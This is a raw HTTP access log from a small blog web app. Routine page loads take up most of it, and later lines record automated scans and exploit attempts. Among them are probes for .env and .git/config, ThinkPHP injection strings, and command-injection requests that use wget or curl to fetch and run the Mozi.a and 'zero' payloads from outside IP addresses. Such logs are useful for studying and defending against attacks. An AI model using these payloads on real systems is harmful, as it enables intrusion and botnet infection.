[0mGET / [36m304 [0m11.005 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.711 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.038 ms - -[0m
[0mGET /blogs [36m304 [0m1.547 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.541 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.525 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.359 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.798 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.991 ms - -[0m
[0mGET / [36m304 [0m1.348 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.542 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.482 ms - -[0m
[0mGET /blogs [36m304 [0m1.117 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.744 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.966 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.253 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.430 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.457 ms - -[0m
[0mGET / [36m304 [0m1.682 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.819 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.033 ms - -[0m
[0mGET /blogs [36m304 [0m1.778 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.544 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.354 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.140 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.787 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.014 ms - -[0m
[0mGET / [36m304 [0m1.205 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.432 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.208 ms - -[0m
[0mGET /blogs [36m304 [0m1.073 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.754 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.890 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.118 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.515 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.346 ms - -[0m
[0mGET / [36m304 [0m1.097 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.865 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.109 ms - -[0m
[0mGET /blogs [36m304 [0m0.962 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.765 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.932 ms - -[0m
[0mGET /blogs/add [36m304 [0m0.975 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.451 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.304 ms - -[0m
[0mGET / [36m304 [0m1.048 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.772 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.816 ms - -[0m
[0mGET /blogs [36m304 [0m1.004 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.647 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.889 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.049 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.467 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.282 ms - -[0m
[0mGET / [36m304 [0m1.084 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.403 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.479 ms - -[0m
[0mGET /blogs [36m304 [0m1.120 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.891 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.955 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.173 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.493 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.325 ms - -[0m
[0mGET / [36m304 [0m1.039 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.807 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.923 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.611 ms - 913[0m
[0mGET / [36m304 [0m1.054 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.504 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.330 ms - -[0m
[0mGET /blogs [36m304 [0m1.050 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.429 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.225 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.027 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.726 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.948 ms - -[0m
[0mGET / [36m304 [0m1.079 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.464 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.184 ms - -[0m
[0mGET /blogs [36m304 [0m1.078 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.372 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.487 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.148 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.479 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.302 ms - -[0m
[0mGET / [36m304 [0m1.000 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.781 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.906 ms - -[0m
[0mGET /blogs [36m304 [0m1.071 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.450 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.273 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.041 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.707 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.856 ms - -[0m
[0mGET / [36m304 [0m1.057 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.461 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.239 ms - -[0m
[0mGET / [36m304 [0m1.001 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.344 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.486 ms - -[0m
[0mGET /blogs [36m304 [0m0.993 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.696 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.897 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.132 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.461 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.304 ms - -[0m
[0mGET / [36m304 [0m1.056 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.747 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.927 ms - -[0m
[0mGET /blogs [36m304 [0m0.993 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.495 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.273 ms - -[0m
[0mGET /blogs/add [36m304 [0m0.974 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.706 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.858 ms - -[0m
[0mGET / [36m304 [0m1.095 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.479 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.246 ms - -[0m
[0mGET /.env [33m404 [0m1.006 ms - 913[0m
[0mPOST / [33m404 [0m11.602 ms - 913[0m
[0mGET / [32m200 [0m0.995 ms - 844[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.898 ms - 913[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.250 ms - 874[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.647 ms - -[0m
[0mGET /js/jquery.min.js [33m404 [0m2.107 ms - 913[0m
[0mGET /stylesheets/style.css [32m200 [0m3.472 ms - 111[0m
[0mGET /portal/redlion [33m404 [0m2.301 ms - 913[0m
[0mGET / [32m200 [0m0.922 ms - 844[0m
[0mGET /js/jquery.min.js [33m404 [0m0.841 ms - 913[0m
[0mGET /stylesheets/style.css [32m200 [0m1.847 ms - 111[0m
[0mGET /js/bootstrap.min.js [33m404 [0m0.738 ms - 913[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.744 ms - 160302[0m
[0mGET /blogs [32m200 [0m1.121 ms - 774[0m
[0mGET /stylesheets/style.css [36m304 [0m0.318 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.498 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.826 ms - 913[0m
[0mGET /blogs/add [32m200 [0m2.012 ms - 771[0m
[0mGET /stylesheets/style.css [36m304 [0m0.723 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.014 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.741 ms - 913[0m
[0mGET / [36m304 [0m1.006 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.697 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.872 ms - -[0m
[0mGET / [32m200 [0m1.089 ms - 844[0m
[0mGET / [32m200 [0m0.844 ms - 844[0m
[0mGET / [32m200 [0m1.907 ms - 844[0m
[0mGET /stylesheets/style.css [32m200 [0m0.641 ms - 111[0m
[0mGET /favicon.ico [33m404 [0m0.848 ms - 913[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.694 ms - 160302[0m
[0mGET /blogs [32m200 [0m1.028 ms - 774[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.523 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.340 ms - -[0m
[0mGET /blogs/add [32m200 [0m1.047 ms - 771[0m
[0mGET /stylesheets/style.css [36m304 [0m0.351 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.453 ms - -[0m
[0mGET /blogs/add [36m304 [0m0.978 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.395 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.209 ms - -[0m
[0mGET /blogs [36m304 [0m1.050 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.725 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.855 ms - -[0m
[0mGET / [36m304 [0m1.013 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.392 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.505 ms - -[0m
[0mGET /blogs [36m304 [0m1.000 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.349 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.489 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.027 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.354 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.497 ms - -[0m
[0mGET / [36m304 [0m0.993 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.468 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.234 ms - -[0m
[0mGET / [32m200 [0m1.024 ms - 844[0m
[0mGET / [32m200 [0m0.986 ms - 844[0m
[0mGET / [32m200 [0m0.930 ms - 844[0m
[0mGET / [32m200 [0m0.984 ms - 844[0m
[0mGET /currentsetting.htm [33m404 [0m0.946 ms - 913[0m
[0mGET /scgi-bin/platform.cgi [33m404 [0m1.061 ms - 913[0m
[0mGET /cgi-bin/p2p.cgi?cmd=p2p.cgi&-action=get [33m404 [0m0.970 ms - 913[0m
[0mGET /cgi-bin/welcome.cgi [33m404 [0m1.105 ms - 913[0m
[0mGET /index.html [33m404 [0m1.002 ms - 913[0m
[0mGET /cgi-bin/webproc [33m404 [0m1.115 ms - 913[0m
[0mGET /HNAP1/ [33m404 [0m0.984 ms - 913[0m
[0mGET /common/info.cgi [33m404 [0m0.937 ms - 913[0m
[0mGET /hnap/hnap_service [33m404 [0m0.962 ms - 913[0m
[0mGET /stssys.htm [33m404 [0m1.012 ms - 913[0m
[0mGET /index.asp [33m404 [0m0.915 ms - 913[0m
[0mGET /login.htm [33m404 [0m0.993 ms - 913[0m
[0mGET /webpages/login.html [33m404 [0m0.900 ms - 913[0m
[0mGET /FHFactoryCheck.html [33m404 [0m1.043 ms - 913[0m
[0mGET /login [33m404 [0m1.057 ms - 913[0m
[0mGET /cgi-bin/dispatcher.cgi?cmd=0 [33m404 [0m0.944 ms - 913[0m
[0mGET /cgi-bin/login.asp [33m404 [0m0.895 ms - 913[0m
[0mGET /rpAuth.html [33m404 [0m0.999 ms - 913[0m
[0mGET /login.asp [33m404 [0m1.025 ms - 913[0m
[0mGET /login/login.html [33m404 [0m1.772 ms - 913[0m
[0mGET /usrlogin.asp [33m404 [0m0.967 ms - 913[0m
[0mGET /login.html [33m404 [0m0.999 ms - 913[0m
[0mGET /html/login.html [33m404 [0m0.967 ms - 913[0m
[0mGET /index_style.css [33m404 [0m0.987 ms - 913[0m
[0mGET /weblogin.htm [33m404 [0m1.072 ms - 913[0m
[0mGET /login.asp [33m404 [0m0.918 ms - 913[0m
[0mGET /admin/login.jsp [33m404 [0m0.958 ms - 913[0m
[0mGET /auth/login/ [33m404 [0m1.011 ms - 913[0m
[0mGET /client/login [33m404 [0m0.964 ms - 913[0m
[0mGET /upnp.jsp [33m404 [0m0.916 ms - 913[0m
[0mGET /cgi-bin/luci/web [33m404 [0m0.957 ms - 913[0m
[0mGET /login.asp [33m404 [0m1.020 ms - 913[0m
[0mGET /index.html [33m404 [0m0.949 ms - 913[0m
[0mGET /login.html [33m404 [0m0.861 ms - 913[0m
[0mGET /index.htm [33m404 [0m0.929 ms - 913[0m
[0mGET /images/favicon.ico [33m404 [0m1.015 ms - 913[0m
[0mGET /index.en-us.uil [33m404 [0m0.953 ms - 913[0m
[0mGET /request_para.cgi?parameter=netstate [33m404 [0m0.918 ms - 913[0m
[0mGET /login.html [33m404 [0m0.940 ms - 913[0m
[0mGET /home/login.html [33m404 [0m0.914 ms - 913[0m
[0mGET /chinese.js [33m404 [0m0.966 ms - 913[0m
[0mGET /img/R1/favicon.ico [33m404 [0m1.012 ms - 913[0m
[0mGET /static/js/first.txt [33m404 [0m0.947 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.939 ms - 913[0m
[0mGET /magis/ [33m404 [0m0.926 ms - 913[0m
[0mGET /common.js [33m404 [0m7.189 ms - 913[0m
[0mGET /home.asp [33m404 [0m0.993 ms - 913[0m
[0mGET /login.html [33m404 [0m0.976 ms - 913[0m
[0mGET /cgi-bin/welcome.cgi [33m404 [0m0.941 ms - 913[0m
[0mGET /cgi-bin/luci [33m404 [0m0.858 ms - 913[0m
[0mGET /cgi-bin/welcome.cgi [33m404 [0m2.454 ms - 913[0m
[0mGET /cgi-bin/luci [33m404 [0m0.953 ms - 913[0m
[0mGET / [32m200 [0m1.042 ms - 844[0m
[0mGET /cgi-bin/user/Config.cgi?.cab&action=get&category=Account.* [33m404 [0m0.981 ms - 913[0m
[0mGET /cgi-bin/nobody/Machine.cgi?action=get_capability [33m404 [0m0.995 ms - 913[0m
[0mGET /current_config/passwd [33m404 [0m1.868 ms - 913[0m
[0mGET /system.ini?loginuse&loginpas [33m404 [0m0.936 ms - 913[0m
[0mGET / [32m200 [0m0.963 ms - 844[0m
[0mGET / [32m200 [0m0.960 ms - 844[0m
[0mGET /cgi-bin/luci [33m404 [0m0.920 ms - 913[0m
[0mGET / [32m200 [0m0.943 ms - 844[0m
[0mGET /.env [33m404 [0m0.940 ms - 913[0m
[0mPOST / [33m404 [0m1.043 ms - 913[0m
[0mGET / [32m200 [0m1.668 ms - 844[0m
[0mGET / [32m200 [0m0.790 ms - 844[0m
[0mGET / [32m200 [0m1.041 ms - 844[0m
[0mGET /admin-scripts.asp [33m404 [0m0.947 ms - 913[0m
[0mGET / [32m200 [0m0.979 ms - 844[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.973 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.888 ms - 844[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.934 ms - 844[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.910 ms - 913[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.110 ms - 913[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.055 ms - 913[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.014 ms - 913[0m
[0mGET / [32m200 [0m0.891 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.769 ms - 913[0m
[0mGET / [32m200 [0m0.946 ms - 844[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://180.123.224.196:57930/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.961 ms - 913[0m
[0mGET / [32m200 [0m0.965 ms - 844[0m
[0mGET /hudson [33m404 [0m0.867 ms - 913[0m
[0mGET http://example.com/ [32m200 [0m0.959 ms - 844[0m
[0mGET / [32m200 [0m1.839 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.936 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.919 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.698 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.976 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.698 ms - 913[0m
[0mGET /.env [33m404 [0m0.851 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.862 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.839 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.754 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.765 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.773 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.056 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.738 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.757 ms - 913[0m
[0mGET / [32m200 [0m0.990 ms - 844[0m
[0mPOST /boaform/admin/formPing [33m404 [0m0.761 ms - 913[0m
[0mGET / [32m200 [0m0.915 ms - 844[0m
[0mGET / [32m200 [0m0.944 ms - 844[0m
[0mGET / [32m200 [0m1.826 ms - 844[0m
[0mGET / [32m200 [0m0.887 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.767 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.964 ms - 913[0m
[0mGET / [36m304 [0m1.027 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.509 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.296 ms - -[0m
[0mGET /favicon.ico [33m404 [0m1.037 ms - 913[0m
[0mGET /blogs [36m304 [0m1.699 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.420 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.452 ms - -[0m
[0mGET /blogs/add [36m304 [0m2.412 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.748 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.829 ms - -[0m
[0mGET / [36m304 [0m0.936 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.403 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.468 ms - -[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.775 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.768 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.795 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.777 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.797 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.861 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.816 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.821 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.789 ms - 913[0m
[0mGET / [32m200 [0m0.885 ms - 844[0m
[0mGET / [32m200 [0m0.934 ms - 844[0m
[0mGET http://5.188.210.227/echo.php [33m404 [0m1.570 ms - 913[0m
[0mGET / [32m200 [0m0.942 ms - 844[0m
[0mGET http://example.com/ [32m200 [0m0.949 ms - 844[0m
[0mGET / [32m200 [0m5.522 ms - 844[0m
[0mGET / [32m200 [0m1.766 ms - 844[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.934 ms - 913[0m
[0mGET / [32m200 [0m1.298 ms - 844[0m
[0mGET / [32m200 [0m1.755 ms - 844[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.938 ms - 844[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m3.264 ms - 844[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m4.307 ms - 913[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.884 ms - 913[0m
[0mGET /phpmyadmin/ [33m404 [0m0.962 ms - 913[0m
[0mGET / [32m200 [0m1.857 ms - 844[0m
[0mGET / [32m200 [0m0.687 ms - 844[0m
[0mGET /portal/redlion [33m404 [0m0.900 ms - 913[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.916 ms - 913[0m
[0mGET / [32m200 [0m0.954 ms - 844[0m
[0mGET / [32m200 [0m0.866 ms - 844[0m
[0mGET / [32m200 [0m0.924 ms - 844[0m
[0mGET / [32m200 [0m0.947 ms - 844[0m
[0mGET / [32m200 [0m0.843 ms - 844[0m
[0mGET / [32m200 [0m0.888 ms - 844[0m
[0mGET / [32m200 [0m0.924 ms - 844[0m
[0mHEAD /robots.txt [33m404 [0m0.869 ms - 913[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.990 ms - 913[0m
[0mGET / [32m200 [0m0.879 ms - 844[0m
[0mGET / [32m200 [0m0.871 ms - 844[0m
[0mGET /.env [33m404 [0m0.929 ms - 913[0m
[0mPOST / [33m404 [0m1.080 ms - 913[0m
[0mGET / [32m200 [0m1.025 ms - 844[0m
[0mGET /level/15/exec/-/sh/run/CR [33m404 [0m1.784 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.234 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.566 ms - 913[0m
[0mGET / [32m200 [0m1.015 ms - 844[0m
[0mGET / [32m200 [0m0.925 ms - 844[0m
[0mGET /manager/text/list [33m404 [0m0.894 ms - 913[0m
[0mGET / [32m200 [0m0.925 ms - 844[0m
[0mGET /.env [33m404 [0m0.820 ms - 913[0m
[0mGET /.git/config [33m404 [0m0.938 ms - 913[0m
[0mGET /composer.json [33m404 [0m1.795 ms - 913[0m
[0mGET /composer.lock [33m404 [0m0.912 ms - 913[0m
[0mGET / [32m200 [0m0.898 ms - 844[0m
[0mGET /frontend_dev.php/$ [33m404 [0m0.930 ms - 913[0m
[0mGET /debug/default/view?panel=config [33m404 [0m1.001 ms - 913[0m
[0mGET / [32m200 [0m0.931 ms - 844[0m
[0mGET / [32m200 [0m0.886 ms - 844[0m
[0mGET /wp-includes/js/jquery/jquery.js [33m404 [0m0.814 ms - 913[0m
[0mGET /administrator/help/en-GB/toc.json [33m404 [0m0.749 ms - 913[0m
[0mGET /administrator/language/en-GB/install.xml [33m404 [0m0.855 ms - 913[0m
[0mGET /plugins/system/debug/debug.xml [33m404 [0m1.758 ms - 913[0m
[0mGET /administrator/ [33m404 [0m0.890 ms - 913[0m
[0mGET /misc/ajax.js [33m404 [0m0.904 ms - 913[0m
[0mGET / [32m200 [0m0.990 ms - 844[0m
[0mGET /admin/view/javascript/common.js [33m404 [0m0.894 ms - 913[0m
[0mGET /admin/includes/general.js [33m404 [0m0.846 ms - 913[0m
[0mGET /images/editor/separator.gif [33m404 [0m0.910 ms - 913[0m
[0mGET /js/header-rollup-554.js [33m404 [0m0.881 ms - 913[0m
[0mGET /vendor/phpunit/phpunit/build.xml [33m404 [0m0.852 ms - 913[0m
[0mGET /fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media [33m404 [0m0.914 ms - 913[0m
[0mGET /.env [33m404 [0m0.840 ms - 913[0m
[0mGET / [32m200 [0m0.797 ms - 844[0m
[0mGET / [32m200 [0m0.947 ms - 844[0m
[0mHEAD /robots.txt [33m404 [0m0.944 ms - 913[0m
[0mGET /manager/html [33m404 [0m0.976 ms - 913[0m
[0mGET / [32m200 [0m0.929 ms - 844[0m
[0mGET / [32m200 [0m0.928 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.711 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.913 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.909 ms - 913[0m
[0mGET / [32m200 [0m0.908 ms - 844[0m
[0mGET /.env [33m404 [0m0.926 ms - 913[0m
[0mPOST / [33m404 [0m1.032 ms - 913[0m
[0mGET / [32m200 [0m0.987 ms - 844[0m
[0mGET / [32m200 [0m0.951 ms - 844[0m
[0mGET / [36m304 [0m0.889 ms - -[0m
[0mGET / [32m200 [0m3.928 ms - 844[0m
[0mGET /phpmyadmin/ [33m404 [0m0.938 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m1.676 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.743 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.752 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.993 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.810 ms - 913[0m
[0mGET / [32m200 [0m0.937 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.747 ms - 913[0m
[0mGET / [32m200 [0m0.929 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.784 ms - 913[0m
[0mGET / [32m200 [0m0.903 ms - 844[0m
[0mGET / [32m200 [0m5.939 ms - 844[0m
[0mGET / [32m200 [0m0.917 ms - 844[0m
[0mGET / [32m200 [0m0.865 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.798 ms - 913[0m
[0mGET /muieblackcat [33m404 [0m0.892 ms - 913[0m
[0mGET //phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php [33m404 [0m0.850 ms - 913[0m
[0mGET //phpMyAdmin-2.10.0.0/scripts/setup.php [33m404 [0m0.896 ms - 913[0m
[0mGET //phpMyAdmin-2.11.11/scripts/setup.php [33m404 [0m0.796 ms - 913[0m
[0mGET //phpMyAdmin-2.11.11.3/scripts/setup.php [33m404 [0m0.782 ms - 913[0m
[0mGET //phpMyAdmin-2.11.11.3/scripts/setup.ph [33m404 [0m0.780 ms - 913[0m
[0mGET //phpMyAdmin-2.11.11.3-all-languages/scripts/setup.php [33m404 [0m0.754 ms - 913[0m
[0mGET //phpMyAdmin-2/scripts/setup.php [33m404 [0m0.842 ms - 913[0m
[0mGET //my/scripts/setup.php [33m404 [0m0.955 ms - 913[0m
